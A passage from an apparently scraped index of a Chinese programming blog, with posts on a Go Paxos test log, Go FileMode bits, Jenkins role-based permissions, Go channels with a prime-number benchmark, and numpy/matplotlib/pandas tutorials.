pren:0 value:} 2019/08/28 18:58:29 nt recv message :{from:2 to:1003 typ:3 n:66539 pren:0 value:} 2019/08/28 18:58:29 proposer: 1003 received a new promise {from:2 to:1003 typ:3 n:66539 pren:0 value:} 2019/08/28 18:58:29 nt recv message :{from:1002 to:3 typ:1 n:66538 pren:0 value:} 2019/08/28 18:58:29 acceptor 3 [promised: {from:0 to:0 typ:0 n:0 pren:0 value:}] promised {from:1002 to:3 typ:1 n:66538 pren:0 value:} 2019/08/28 18:58:29 nt send message :{from:3 to:1002 typ:3 n:66538 pren:0 value:} 2019/08/28 18:58:29 nt recv message :{from:3 to:1002 typ:3 n:66538 pren:0 value:} 2019/08/28 18:58:29 proposer: 1002 received a new promise {from:3 to:1002 typ:3 n:66538 pren:0 value:} 2019/08/28 18:58:29 1002 promise 66538 reached quorum 2 proposer 1002: 2019/08/28 18:58:29 nt send message :{from:1002 to:1 typ:2 n:66538 pren:0 value:hello world v1002} proposer 1002: 2019/08/28 18:58:29 nt send message :{from:1002 to:3 typ:2 n:66538 pren:0 value:hello world v1002} 2019/08/28 18:58:29 nt recv message :{from:1002 to:3 typ:2 n:66538 pren:0 value:hello world v1002} 2019/08/28 18:58:29 acceptor 3 [promised: {from:1002 to:3 typ:1 n:66538 pren:0 value:}, accept: {from:0 to:0 typ:0 n:0 pren:0 value:}] accepted propose: {from:1002 to:3 typ:2 n:66538 pren:0 value:hello world v1002} 2019/08/28 18:58:29 nt send message :{from:3 to:2001 typ:4 n:66538 pren:0 value:hello world v1002} 2019/08/28 18:58:29 nt send message :{from:3 to:2002 typ:4 n:66538 pren:0 value:hello world v1002} 2019/08/28 18:58:29 nt recv message :{from:3 to:2001 typ:4 n:66538 pren:0 value:hello world v1002} 2019/08/28 18:58:29 learner 2001 has learned a new proposal mes: {from:3 to:2001 typ:4 n:66538 pren:0 value:hello world v1002} 2019/08/28 18:58:29 nt recv message :{from:1003 to:1 typ:1 n:66539 pren:0 value:} 2019/08/28 18:58:29 acceptor 1 [promised: {from:1002 to:1 typ:1 n:66538 pren:0 value:}] promised {from:1003 to:1 typ:1 n:66539 pren:0 value:} 2019/08/28 18:58:29 nt send message :{from:1 to:1003 typ:3 n:66539 pren:0 value:} 2019/08/28 18:58:29 nt recv message :{from:1002 to:1 typ:2 n:66538 pren:0 value:hello world v1002} 2019/08/28 18:58:29 acceptor 1 [promised: {from:1003 to:1 typ:1 n:66539 pren:0 value:}] ignored propose mes: {from:1002 to:1 typ:2 n:66538 pren:0 value:hello world v1002} 2019/08/28 18:58:29 nt recv message :{from:1 to:1003 typ:3 n:66539 pren:0 value:} 2019/08/28 18:58:29 proposer: 1003 received a new promise {from:1 to:1003 typ:3 n:66539 pren:0 value:} 2019/08/28 18:58:29 1003 promise 66539 reached quorum 2 proposer 1003: 2019/08/28 18:58:29 nt send message :{from:1003 to:1 typ:2 n:66539 pren:0 value:hello world v1003} proposer 1003: 2019/08/28 18:58:29 nt send message :{from:1003 to:2 typ:2 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 nt recv message :{from:1003 to:2 typ:2 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 acceptor 2 [promised: {from:1003 to:2 typ:1 n:66539 pren:0 value:}, accept: {from:0 to:0 typ:0 n:0 pren:0 value:}] accepted propose: {from:1003 to:2 typ:2 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 nt send message :{from:2 to:2001 typ:4 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 nt send message :{from:2 to:2002 typ:4 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 nt recv message :{from:2 to:2001 typ:4 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 learner 2001 has learned a new proposal mes: {from:2 to:2001 typ:4 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 nt recv message :{from:1003 to:1 typ:2 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 acceptor 1 [promised: {from:1003 to:1 typ:1 n:66539 pren:0 value:}, accept: {from:0 to:0 typ:0 n:0 pren:0 value:}] accepted propose: {from:1003 to:1 typ:2 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 nt send message :{from:1 to:2001 typ:4 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 nt send message :{from:1 to:2002 typ:4 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 nt recv message :{from:1 to:2001 typ:4 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 learner 2001 has learned a new proposal mes: {from:1 to:2001 typ:4 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 learner :2001 has chosen proposal : {2 2001 4 66539 0 hello world v1003} 2019/08/28 18:58:29 nt recv message :{from:3 to:2002 typ:4 n:66538 pren:0 value:hello world v1002} 2019/08/28 18:58:29 learner 2002 has learned a new proposal mes: {from:3 to:2002 typ:4 n:66538 pren:0 value:hello world v1002} 2019/08/28 18:58:29 nt recv message :{from:2 to:2002 typ:4 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 learner 2002 has learned a new proposal mes: {from:2 to:2002 typ:4 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 nt recv message :{from:1 to:2002 typ:4 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 learner 2002 has learned a new proposal mes: {from:1 to:2002 typ:4 n:66539 pren:0 value:hello world v1003} 2019/08/28 18:58:29 learner :2002 has chosen proposal : {2 2002 4 66539 0 hello world v1003} 2019/08/28 18:58:29 nt recv message :{from:1 to:1001 typ:3 n:66537 pren:0 value:} 2019/08/28 18:58:29 proposer: 1001 received a new promise {from:1 to:1001 typ:3 n:66537 pren:0 value:} 2019/08/28 18:58:29 nt recv message :{from:2 to:1001 typ:3 n:66537 pren:0 value:} 2019/08/28 18:58:29 proposer: 1001 received a new promise {from:2 to:1001 typ:3 n:66537 pren:0 value:} 2019/08/28 18:58:29 1001 promise 66537 reached quorum 2 proposer 1001: 2019/08/28 18:58:29 nt send message :{from:1001 to:1 typ:2 n:66537 pren:0 value:hello world v1001} proposer 1001: 2019/08/28 18:58:29 nt send message :{from:1001 to:2 typ:2 n:66537 pren:0 value:hello world v1001} 2019/08/28 18:58:29 nt recv message :{from:1001 to:2 typ:2 n:66537 pren:0 value:hello world v1001} 2019/08/28 18:58:29 acceptor 2 [promised: {from:1003 to:2 typ:1 n:66539 pren:0 value:}] ignored propose mes: {from:1001 to:2 typ:2 n:66537 pren:0 value:hello world v1001} 2019/08/28 18:58:29 nt recv message :{from:1001 to:1 typ:2 n:66537 pren:0 value:hello world v1001} 2019/08/28 18:58:29 acceptor 1 [promised: {from:1003 to:1 typ:1 n:66539 pren:0 value:}] ignored propose mes: {from:1001 to:1 typ:2 n:66537 pren:0 value:hello world v1001} --- PASS: TestNPropose (0.65s) PASS 当有3个acceptor(1,2,3),2个proposer(1001,1002),2个learner(2001,2002),能证明learner最终能chosen统一的提案N.\n参考  大佬的github传送车 维基百科  ","permalink":"https://www.fenghong.tech/blog/algorithm/paxos/","tags":["go","paxos","algorithm"],"title":"go Paxos"},{"categories":["golang"],"contents":"[TOC]\nFileMode 官方的解释:\n A FileMode represents a file\u0026rsquo;s mode and permission bits. The bits have the same definition on all systems, so that information about files can be moved from one system to another portably. Not all bits apply to all systems. The only required bit is ModeDir for directories.\n 意思大概: FileMode 代表了一个文件的属性和权限位,这些权限位在所有的文件系统都一样;因此在各个系统中都能很好的迁移,唯一要求的位就是ModeDir.\ntype FileMode uint32 const ( // The single letters are the abbreviations // used by the String method's formatting. ModeDir FileMode = 1 \u0026lt;\u0026lt; (32 - 1 - iota) // d: is a directory ModeAppend // a: append-only ModeExclusive // l: exclusive use ModeTemporary // T: temporary file; Plan 9 only ModeSymlink // L: symbolic link ModeDevice // D: device file ModeNamedPipe // p: named pipe (FIFO) ModeSocket // S: Unix domain socket ModeSetuid // u: setuid ModeSetgid // g: setgid ModeCharDevice // c: Unix character device, when ModeDevice is set ModeSticky // t: sticky ModeIrregular // ?: non-regular file; nothing else is known about this file // Mask for the type bits. For regular files, none will be set. ModeType = ModeDir | ModeSymlink | ModeNamedPipe | ModeSocket | ModeDevice | ModeCharDevice | ModeIrregular ModePerm FileMode = 0777 // Unix permission bits ) 官方用uint32来存储定义每个一个文件的mode;其中引用到的位只有uint32的前13位;具体可以看后续的代码分析.uint32的后9位来存储文件的权限permissions.为了更清楚的表示.我这边验证了一下.\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/imroc/biu\u0026#34; //这里引用了一下大牛的binary包,需要自己手动添加一下os.FileMode类型在函数里面.  //在biu.go里添加一下即可,不然会无法解析,因为将os.FileMode转uint32类型进行匹配.  //case os.FileMode: \t//\ts = Uint32ToBinaryString(uint32(v)) \t\u0026#34;os\u0026#34; ) func main(){ //用了一下biu的转二进制的包,这样看起来更清晰,  //如果直接用fmt.Printf(\u0026#34;%b\u0026#34;,os.ModePerm)前面的0会被省略. \tfmt.Println(biu.ToBinaryString(os.ModePerm)) fmt.Println(biu.ToBinaryString(os.ModeDir)) fmt.Println(biu.ToBinaryString(os.ModeAppend)) fmt.Println(biu.ToBinaryString(os.ModeExclusive)) fmt.Println(biu.ToBinaryString(os.ModeTemporary)) fmt.Println(biu.ToBinaryString(os.ModeSymlink)) fmt.Println(biu.ToBinaryString(os.ModeDevice)) fmt.Println(biu.ToBinaryString(os.ModeNamedPipe)) fmt.Println(biu.ToBinaryString(os.ModeSocket)) fmt.Println(biu.ToBinaryString(os.ModeSetuid)) fmt.Println(biu.ToBinaryString(os.ModeSetgid)) fmt.Println(biu.ToBinaryString(os.ModeCharDevice)) fmt.Println(biu.ToBinaryString(os.ModeSticky)) fmt.Println(biu.ToBinaryString(os.ModeIrregular)) fmt.Println(biu.ToBinaryString(os.ModeType)) } /* [00000000 00000000 00000001 11111111] [10000000 00000000 00000000 00000000] [01000000 00000000 00000000 00000000] [00100000 00000000 00000000 00000000] [00010000 00000000 00000000 00000000] [00001000 00000000 00000000 00000000] [00000100 00000000 00000000 00000000] [00000010 00000000 00000000 00000000] [00000001 00000000 00000000 00000000] [00000000 10000000 00000000 00000000] [00000000 01000000 00000000 00000000] [00000000 00100000 00000000 00000000] [00000000 00010000 00000000 00000000] [00000000 00001000 00000000 00000000] [10001111 00101000 00000000 00000000] */\t因为经常使用Linux系统,对其中的文件系统的权限设置很敢兴趣,便研究了drwxrwxrwx这个文件夹0777权限在go中是如何实现转换的.源码如下\nfunc (m FileMode) String() string { const str = \u0026#34;dalTLDpSugct?\u0026#34; var buf [32]byte // Mode is uint32. \tw := 0 for i, c := range str { if m\u0026amp;(1\u0026lt;\u0026lt;uint(32-1-i)) != 0 { buf[w] = byte(c) w++ } } if w == 0 { buf[w] = \u0026#39;-\u0026#39; w++ } const rwx = \u0026#34;rwxrwxrwx\u0026#34; for i, c := range rwx { if m\u0026amp;(1\u0026lt;\u0026lt;uint(9-1-i)) != 0 { buf[w] = byte(c) } else { buf[w] = \u0026#39;-\u0026#39; } w++ } return string(buf[:w]) } 源码很简洁,一个String()函数,就将对应关系弄的明明白白.前面的定义是处理FileMode的13种类型,占String()的一个字节例如d---------;后面定义的是FileMode的权限也就是rwxrwxrwx用uint32表示即为0777.解读如下:\nconst str = \u0026#34;dalTLDpSugct?\u0026#34; //这个对应了上面DirMode的13个类型,也就是FileMode这个`uint32`类型的前13位bit. \tvar buf [32]byte // 用来存储uint32位的每一位的结果,存储类型为byte //接着就进行了遍历。对str遍历。 \tfor i, c := range str { if m\u0026amp;(1\u0026lt;\u0026lt;uint(32-1-i)) != 0 { buf[w] = byte(c) w++ } } // m\u0026amp;(1\u0026lt;\u0026lt;uint(32-1-i)) 这个是将1左移uint(32-1-i)位,在和m进行逻辑与 // 相当于m和FileMode的13种类型进行比对,如果m和FileMode的13种类型有匹配关系的. // 那么与结果看到不为0,必定为1.这个确定的是文件的mode类型, // 如果m是文件夹,那么m对应的String()也就是`d---------` .  // permissions的函数解决如下. \tconst rwx = \u0026#34;rwxrwxrwx\u0026#34; //和unix的权限类型对应起来了.看起来很熟悉对不对 \tfor i, c := range rwx { if m\u0026amp;(1\u0026lt;\u0026lt;uint(9-1-i)) != 0 { // 如果 \u0026amp; 结果不为零; 说明为真 ; 将该位置为相应的字符;否则置空 \t// 第一位即最高位为1,可读权限 1 0000 0000 = 400 \t// 第二位为1 0 1000 0000 = 200 \t// 第三位为1 0 0100 0000 = 100 \t// rwx ==\u0026gt; 700 \t// 第四位为1 0 0010 0000 = 040 \t// 第五位为1 0 0001 0000 = 020 \t// 第六位为1 0 0000 1000 = 010 \t// rwx ==\u0026gt; 070 \t// 第七位为1 0 0000 0100 = 004 \t// 第八位为1 0 0000 0010 = 002 \t// 第九位为1 0 0000 0001 = 001 \tbuf[w] = byte(c) } else { // 如果\u0026amp;结果为零,说明该位为0,就直接置空\u0026#39;-\u0026#39; \tbuf[w] = \u0026#39;-\u0026#39; } w++ } 检验一下:\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/imroc/biu\u0026#34; \u0026#34;os\u0026#34; ) func main(){ var m1 os.FileMode var m2 uint16 //权限控制其实uint16位就足够了,但是加上`mode`的13种类型就不够了 \tm2 = 0775 fmt.Printf(\u0026#34;%b\\n\u0026#34;,m2) m1 = 0775 //每一位都是8进制, 775 -\u0026gt; 111111101 \tfmt.Printf(\u0026#34;%b\\n\u0026#34;,m1) fmt.Println(m1.String()) fmt.Println(os.ModeDir.String()) } /* 111111101 111111101 -rwxrwxr-x d--------- */ 记录一下学习golang的过程~第34天\n","permalink":"https://www.fenghong.tech/blog/go/go-filemode/","tags":["go","mode"],"title":"go filemode 源码理解"},{"categories":["ops","jenkins"],"contents":"[TOC]\n 背景\n公司的jenkins管理了很多的项目,不同项目的开发人员不同,需要对不同的人员进行权限分类,google了一下,在官网找到了Role-based Authorization Strategy这个插件,基本能满足要求.\n 基于 Role based Strategy  安装插件  在系统管理页面点击 Manage Jenkins \u0026ndash;\u0026gt;Manage Plugins\u0026ndash;\u0026gt;Available,在Filter中输入Role based,找到我们想要的插件,安装即可.\n 配置使用插件  在系统管理页面点击Configure Global Security \u0026ndash;\u0026gt;Access Contral ,在Authorization字段勾选Role-based Strategy\n 官网上安全域设置为Servlet容器代理，实际操作发现Jenkins专有用户数据库也是可以的。\n 配置权限 在系统管理页面点击Manage and Assign Roles进入角色管理页面：\n这里有两个参数,一个是Manage Roles,一个是Assign Roles\n 管理角色（Manage Roles）  选择该项可以创建全局角色、项目角色，并可以为角色分配权限。\n在global roles添加用户组member.添加all/read权限\nProject角色 就是可以根据不任务前缀 进行隔离，以下创建了 sonar 分组 ,该创建了2个角色，管理员 （具有配置构建等权限）普通角色（只有构建权限）\n注意： Pattern 是任务前缀的匹配,必须要写sonar.*而不是sonar,当然中文也支持.例如任务名 sonar 开头的任务只会被sonar分组的用户看到.\n然后sava退出.\n 分配角色权限  在系统管理页面点击Manage and Assign Roles进入分配角色页面：\n在global roles中,将sonar和sonarM两个角色加入member这个管理组,\n在Item roles中,将sonar用户加入sonar项目组;将sonarM用户加入sonarM项目管理组\n然后save保存退出.\n验证 使用sonarM用户登录,只有sonar开头的项目才能被展示,且拥有所有的管理权限\n使用sonar用户登录,只有build权限\n","permalink":"https://www.fenghong.tech/blog/ops/jenkins-role-base-strategy/","tags":["ops","jenkins","Authorization"],"title":"jenkins实现不同角色不同权限"},{"categories":["golang"],"contents":"[TOC]\nchannel  为什么需要channel   1)使用全局变量加锁同步来解决go routine的通讯，但不完美\n2)主线程在等待所有goroutine全部完成的时间很难确定。\n3)如果主线程休眠时间长了，会加长等待时间，如果等待时间短了，可能还有goroutine处于工作状态，这时也会随主线程的退出而销毁\n4)通过全局变量加锁同步来实现通讯，也并不利用多个协程对全局变量的读写操作。\n5)上面种种分析都在呼唤一个新的通讯机制-channe\n  channel 基本介绍   1)channle本质就是一个数据结构-队列 2)数据是先进先出【FIFO:firstinfirstout】 3)线程安全，多goroutine访问时，不需要加锁，就是说channel本身就是线程安全的 4)channel有类型的，一个string的channel只能存放string类型数据。\n  channel的注意点~   使用内置函数close可以关闭channel，不能再写入数据，只能读取数据. 在遍历channel时,如果channel没有关闭,则会有deadlock错误. 如果channel已经关闭,则正常遍历,遍历完数组就退出.\n channel简单的实现 要求写在注释里面~\npackage main import \u0026quot;fmt\u0026quot; // 开启一个writeData协程,向管道intChan写入50个整数 // 开启一个readData协程,向管道intChan取出writeData写入的数据 // 两个协程操作一个管道,readData这个协程读完数据,给一个信号让主函数退出. // 主线程需要等待两个协程完成才能退出管道 func WriteData(intChan chan int) { for i := 1; i \u0026lt;= 50; i++ { intChan \u0026lt;- i fmt.Println(\u0026quot;WriteData write=\u0026quot;,i) } close(intChan) } func ReadData(intChan chan int, ExitChan chan bool) { for { v, ok := \u0026lt;-intChan //读取intChan里面的数据,读完就break if !ok { break } fmt.Printf(\u0026quot;ReadData read=%v\\n\u0026quot;, v) } //读完后给主函数一个退出信号,并关闭这个channel ExitChan \u0026lt;- true close(ExitChan) } func main() { intChan := make(chan int,50) ExitChan := make(chan bool,1) go WriteData(intChan) go ReadData(intChan,ExitChan) for { //读取ExitChan里面的数据,读完就break _,ok := \u0026lt;-ExitChan if !ok{ break } } } 使用channel提高的效率对比 开启channel可以启用go语言天然的高并发,高并发的有点可以写一个例子体验\n需求: 需求：要求统计1-20000000的数字中，哪些是素数？\n 普通的for循坏方式  package main import ( \u0026quot;fmt\u0026quot; \u0026quot;math\u0026quot; \u0026quot;time\u0026quot; ) func IsPrime(n int64) bool { if n \u0026lt; 2 { return false } for i := 2; i \u0026lt;= int(math.Sqrt(float64(n))); i++ { if int(n)%i == 0 { return false } } return true } func found() { start := time.Now().UnixNano() var i int64 for i = 2; i \u0026lt;= 20000000; i++ { if IsPrime(i) { //fmt.Println(i) } } end := time.Now().UnixNano() fmt.Printf(\u0026quot;普通方法耗时 =%v\\n\u0026quot;, end-start) } func main() { found() }  go 协程处理  package main import ( \u0026quot;fmt\u0026quot; \u0026quot;math\u0026quot; \u0026quot;time\u0026quot; ) func IsPrime(n int64) bool { if n \u0026lt; 2 { return false } for i := 2; i \u0026lt;= int(math.Sqrt(float64(n))); i++ { if int(n)%i == 0 { return false } } return true } func putNum(intChan chan int) { for i := 1; i \u0026lt;= 20000000; i++ { intChan \u0026lt;- i } close(intChan) //放完数据即可关闭 } func primeNum(intChan chan int, primeChan chan int, exitChan chan bool) { for { num, ok := \u0026lt;-intChan if !ok { break } if IsPrime(int64(num)) { primeChan \u0026lt;- num } } // fmt.Println(\u0026quot;没有数据退出\u0026quot;) // 不能关闭primeChan,多协程可能导致安全问题 exitChan \u0026lt;- true } func main() { start := time.Now().UnixNano() intChan := make(chan int, 1000) primChan := make(chan int, 10000000) //存入结果 exitChan := make(chan bool, 4) go putNum(intChan) //起四个线程读取 for i := 0; i \u0026lt; 4; i++ { go primeNum(intChan, primChan, exitChan) } // 起一个协程,阻塞统计是否统计完 go func() { // 从exit取出4个结果,即可关闭primeChan for i := 0; i \u0026lt; 4; i++ { \u0026lt;-exitChan } end := time.Now().UnixNano() fmt.Println(\u0026quot;使用协程耗时 =\u0026quot;, end-start) close(primChan) }() for { _, ok := \u0026lt;-primChan //res,ok := \u0026lt;-primChan if !ok { break } //fmt.Printf(\u0026quot;prime = %d\\n\u0026quot;,res) } fmt.Println(\u0026quot;主线程退出\u0026quot;) } // 每次得到的时间差不多,但是有区别 // 在8Vcpu的linux服务器上运行,起了8个goroutine,速度提升5倍. // # go build goPrime.go // # ./goPrime // 普通方法耗时 =58192386339 // 使用协程耗时= 11656927279 // 主线程退出 计算一个1-20000000内的素数,goroutine速度提升了5倍.且可以使用top命令查询运行的时候,CPU在普通的for循环只占用100%,而用了8个goroutine的,CPU却直接飙升至700%.\n想要了解更多的channel,可以看看Mooc老师的logProcess的那个教学视频mooc,很不错,利用golang将的高并发特效,这个是跟着老师码下来的源码点击看源码\n 参考  mooc\n","permalink":"https://www.fenghong.tech/blog/go/go-channel/","tags":["go","channel"],"title":"Go channel 理解"},{"categories":["Python"],"contents":"[TOC]\npython的numpy库 numpy（Numerical Python）提供了python对多维数组对象的支持：ndarray，具有矢量运算能力，快速、节省空间。numpy支持高级大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。\nNumPy 是非常有名的Python 科学计算工具包，其中 包含了大量有用的思想，比如数组对象（用来表示向量、矩阵、图像等）以及线性 代数函数。数组对象可以帮助你实现数组中重要的操作，比如矩阵乘积、转置、 解方程系统、向量乘积和归一化，这为图像变形、对变化进行建模、图像分类、 图像聚类等提供了基础。\n 图像灰度处理  from PIL import Image import numpy as np a = np.array(Image.open('1.jpg').convert('L')) print(a.shape, a.dtype) # b = (100/255)*a +150 b = 255 * (a/255)**2 # 图像的灰度很重 im = Image.fromarray(b.astype('uint8')) im.save('2.jpg')  图像的手绘处理  # # 相片变为手绘效果图片 # # 黑白灰色 \u0026amp; 便捷线条较重 \u0026amp; 相同或相近色彩趋于白色 \u0026amp; 略有光源效果 # 梯度和虚拟深度值对图像进行重构 from PIL import Image import numpy as np name = input(\u0026quot;please input your jpg Path: \u0026quot;) a = np.asarray(Image.open(name).convert('L')).astype('float') # convert('L')灰度图片 depth = 10. # (0-100) grad = np.gradient(a) # 取图像灰度的梯度值 grad_x, grad_y = grad # 分别取横纵图像梯度值 grad_x = grad_x * depth / 100. grad_y = grad_y * depth / 100. A = np.sqrt(grad_x ** 2 + grad_y ** 2 + 1.) uni_x = grad_x / A uni_y = grad_y / A uni_z = 1. / A vec_el = np.pi / 2.2 # 光源的俯视角度，弧度值 vec_az = np.pi / 4. # 光源的方位角度，弧度值 dx = np.cos(vec_el) * np.cos(vec_az) # 光源对x 轴的影响 dy = np.cos(vec_el) * np.sin(vec_az) # 光源对y 轴的影响 dz = np.sin(vec_el) # 光源对z 轴的影响 b = 255 * (dx * uni_x + dy * uni_y + dz * uni_z) # 光源归一化 b = b.clip(0, 255) # 为避免数据越界，将生成的灰度值裁剪至0-255区间 im = Image.fromarray(b.astype('uint8')) # 重构图像 im.save(\u0026quot;images/new_name.jpg\u0026quot;) 如何批量生成素描文件,这里写了一个for循环即可解决问题.\nfrom PIL import Image import numpy as np import os # 传入的一个是文件全路径,一个是获取文件名称 def generate(name, txt): a = np.asarray(Image.open(name).convert('L')).astype('float') # convert('L')灰度图片 depth = 10. # (0-100) grad = np.gradient(a) # 取图像灰度的梯度值 grad_x, grad_y = grad # 分别取横纵图像梯度值 grad_x = grad_x * depth / 100. grad_y = grad_y * depth / 100. ax = np.sqrt(grad_x ** 2 + grad_y ** 2 + 1.) uni_x = grad_x / ax uni_y = grad_y / ax uni_z = 1. / ax vec_el = np.pi / 2.2 # 光源的俯视角度，弧度值 vec_az = np.pi / 4. # 光源的方位角度，弧度值 dx = np.cos(vec_el) * np.cos(vec_az) # 光源对x 轴的影响 dy = np.cos(vec_el) * np.sin(vec_az) # 光源对y 轴的影响 dz = np.sin(vec_el) # 光源对z 轴的影响 b = 255 * (dx * uni_x + dy * uni_y + dz * uni_z) # 光源归一化 b = b.clip(0, 255) # 为避免数据越界，将生成的灰度值裁剪至0-255区间 im = Image.fromarray(b.astype('uint8')) # 重构图像 im.save(\u0026quot;images/\u0026quot; + txt[-1]) # 获取当前目录下的所有以jpg结尾的文件 def get_files(path='D:\\\\text', rule=\u0026quot;.jpg\u0026quot;): allfile = [] for fpathe, dirs, fs in os.walk(path): # os.walk是获取所有的目录 for f in fs: filename = os.path.join(fpathe, f) if filename.endswith(rule): # 判断是否是\u0026quot;xxx\u0026quot;结尾 allfile.append(filename) return allfile # 入口函数 if __name__ == \u0026quot;__main__\u0026quot;: b = get_files(r\u0026quot;D:\\text\u0026quot;) for i in b: txt = i.split(\u0026quot;\\\\\u0026quot;) generate(i, txt) python的matplotlib库  简单来说，Matplotlib 是 Python 的一个绘图库。它包含了大量的工具，你可以使用这些工具创建各种图形，包括简单的散点图，正弦曲线，甚至是三维图形。Python 科学计算社区经常使用它完成数据可视化的工作。\n 很容易画出一张图\nimport numpy as np import matplotlib.pyplot as plt def f(t): return np.exp(-t) * np.cos(2*np.pi*t) a = np.arange(0.0, 5.0, 0.02) plt.subplot(211) plt.plot(a, f(a)) plt.subplot(212) plt.plot(a, np.cos(2*np.pi*a), 'r--') plt.savefig('images/yuxuan', dpi=600) cn_matp  .plot函数  plt.plot(x, y, format_string, **kwargs): x为x轴数据，可为列表或数组；y同理；format_string 为控制曲线的格式字符串， **kwargs 第二组或更多的（x, y,format_string） format_string: 由 颜色字符、风格字符和标记字符组成。 颜色字符：‘b’蓝色 ；‘#008000’RGB某颜色；‘0.8’灰度值字符串 风格字符：‘-’实线；‘–’破折线； ‘-.’点划线； ‘：’虚线 ； ‘’‘’无线条 标记字符：‘.’点标记 ‘o’ 实心圈 ‘v’倒三角 ‘^’上三角 rcParams 的属性 font.family 用于显示字体的名字 'SimHei'\\ 'Kaiti' font.style 字体风格，'normal'或者 'italic' font.size 字体大小， 'large' 或者'x-small' fontproperties fontsize  pyplot的文本显示函数说明:  plt.xlabel()：对x轴增加文本标签 plt.ylabel()：同理 plt.text(): 在任意位置增加文本 plt.title(2,1,r'$\\mu=100$') 对图形整体增加文本标签,2,1为横轴坐标轴。 plt.annotate() 在图形中加入注解 plt. annotate(s, xy = arrow_crd, xytext = text_crd, arrowprops = dict)\t在图形中加中文注解，正式的余弦函数如下:\nimport numpy as np import matplotlib.pyplot as plt # import matplotlib # matplotlib.rcParams['font.family']='SimHei' # matplotlib.rcParams['font.size']=20 a = np.arange(0.0, 5.0, 0.02) plt.plot(a, np.cos(2*np.pi*a), 'r--') plt.xlabel('横轴: 时间', fontproperties='SimHei', fontsize=15, color='green') plt.ylabel('纵轴: 振幅', fontproperties='SimHei', fontsize=15) plt.title(r'余弦波实例$y=cos(2\\pi x)$', fontproperties='SimHei', fontsize=25) # plt.text(2, 1, r'$\\mu=100$',fontsize=15) # plt.annotate(r'$\\mu=100$', xy=(2, 1), xytext=(3, 1.5), arrowprops=dict(facecolor='black', shrink=0.1, width=2)) plt.axis([-1, 6, -2, 2]) plt.grid(True) plt.savefig('images/cn_matp_arrow', dpi=600)  plot的图标函数：  plt.plot(x,y , fmt) ：绘制坐标图 plt.boxplot(data, notch, position): 绘制箱形图 plt.bar(left, height, width, bottom) : 绘制条形图 plt.barh(width, bottom, left, height) : 绘制横向条形图 plt.polar(theta, r) : 绘制极坐标图 plt.pie(data, explode) : 绘制饼图 plt.scatter(x, y) :绘制散点图 plt.hist(x, bings, normed) : 绘制直方图 python的pandas库 Pandas 是基于 NumPy 的一个非常好用的库，正如名字一样，人见人爱。之所以如此，就在于不论是读取、处理数据，用它都非常简单。\nPandas 有两种自己独有的基本数据结构。读者应该注意的是，它固然有着两种数据结构，因为它依然是 Python 的一个库，所以，Python 中有的数据类型在这里依然适用，也同样还可以使用类自己定义数据类型。只不过，Pandas 里面又定义了两种数据类型：Series 和 DataFrame，它们让数据操作更简单了。\n Series类型  这种样式我们已经熟悉了，不过，在有些时候，需要把它竖过来表示：\n   index data     0 9   1 3   2 8     Dateframe类型  DataFrame 是一种二维的数据结构，非常接近于电子表格或者类似 mysql 数据库的形式。它的竖行称之为 columns，横行跟前面的 Series 一样，称之为 index，也就是说可以通过 columns 和 index 来确定一个主句的位置。\n # series 类型会自动对齐索引，且基于索引, 补齐后运算, 运算默认产生浮点数. import pandas as pd import numpy as np a = pd.DataFrame(np.arange(12).reshape(3, 4)) b = pd.DataFrame(np.arange(20).reshape(4, 5)) c = a.mul(b, fill_value=0) d = pd.Series(np.arange(4)) print(c) print(d-10) print(b-d) # optput: # 0 1 2 3 4 # 0 0.0 1.0 4.0 9.0 0.0 # 1 20.0 30.0 42.0 56.0 0.0 # 2 80.0 99.0 120.0 143.0 0.0 # 3 0.0 0.0 0.0 0.0 0.0 # 0 -10 # 1 -9 # 2 -8 # 3 -7 # dtype: int32 # 0 1 2 3 4 # 0 0.0 0.0 0.0 0.0 NaN # 1 5.0 5.0 5.0 5.0 NaN # 2 10.0 10.0 10.0 10.0 NaN # 3 15.0 15.0 15.0 15.0 NaN  pandas的Dateframe数据丢弃  import pandas as pd d1 = {'城市': ['北京', '上海', '深圳'], '环比': [101.5, 101.2, 103.6], '同比': [110.2, 113.8, 115.3]} d = pd.DataFrame(d1, index=['c1', 'c2', 'c3']) nd = d.drop('c1') print(nd) # output: # 城市 环比 同比 # c2 上海 101.2 113.8 # c3 深圳 103.6 115.3  pandas数据排序  import pandas as pd import numpy as np # 排序，有索引和数值排序 b = pd.DataFrame(np.arange(20).reshape(4, 5), index=['c', 'a', 'b', 'd']) # print(b) # # print(b.sort_index()) # print(b.sort_index(ascending=False)) # print(b.sort_index(axis=1, ascending=False)) # print(b.sort_values(2, ascending=False)) # cumsum:就是当前列之前的和加到当前列上 c = b.cumsum(axis=0) print(b) print(c) # print(b.describe().ix['max']) # output: # 0 1 2 3 4 # c 0 1 2 3 4 # a 5 6 7 8 9 # b 10 11 12 13 14 # d 15 16 17 18 19 # 0 1 2 3 4 # c 0 1 2 3 4 # a 5 7 9 11 13 # b 15 18 21 24 27 # d 30 34 38 42 46  利用正相关来谈论房价.  这里有协方差公式：\n$$cov(X,Y) =E[X-E[X]]E[Y-E[Y]]=E[X*Y] - E[X]E[Y]$$\npearson相关系数：\n因为$\\mu _{X}=E(X)$;\n$\\sigma_{X}^{2}=E(X^{2})-E^{2}(X)$\n同样地，对于$Y$，可以写成:\n$$\\rho _{X,Y}={\\frac {E(XY)-E(X)E(Y)}{{\\sqrt {E(X^{2})-E^{2}(X)}}~{\\sqrt 